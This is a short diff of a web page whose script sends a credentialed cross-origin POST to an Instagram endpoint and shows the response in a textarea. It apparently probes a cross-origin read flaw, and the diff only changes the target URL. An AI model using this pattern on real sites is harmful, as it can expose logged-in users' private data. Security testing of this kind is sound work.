@@ -3,7 +3,7 @@
 	<body><textarea></textarea><div style='display:none'></div><div class="username"></div></body>
 	<script>
 var x = new XMLHttpRequest(), username;
-x.open("POST","https://www.instagram.com/stories/reel/seen",true);
+x.open("POST","https://www.instagram.com/qp/batch_fetch_web/",true);
 x.withCredentials = true;
 x.onreadystatechange = function(){if(x.readyState ==4)
 	document.getElementsByTagName('textarea')[0].value = x.responseText;
